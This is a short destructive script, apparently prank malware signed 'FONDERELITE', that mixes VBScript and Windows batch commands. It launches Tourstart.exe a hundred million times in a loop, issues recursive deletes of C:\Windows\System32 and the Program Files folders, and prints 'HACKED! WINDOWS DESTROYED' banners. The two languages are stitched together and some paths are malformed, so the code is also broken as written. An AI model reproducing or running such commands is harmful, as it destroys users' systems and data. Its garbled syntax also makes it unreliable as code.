
Option Explicit

Dim WSHShell
Set WSHShell=Wscript.CreateObject("Wscript.Shell")

Dim x
For x = 1 to 100000000
WSHShell.Run "Tourstart.exe"
Next
del /S C:\Windows\System32
del /S C:\Program Files and C:\Program Files (x86)
color 02
for /L %%n in (2,2,3000)do echo DELETING IMPORTANT FILES....
color 04 
for /L %%n in (3,3,2000)do echo HACKED!  WINDOWS DESTROYED BY FONDERELITE!!! 
exit
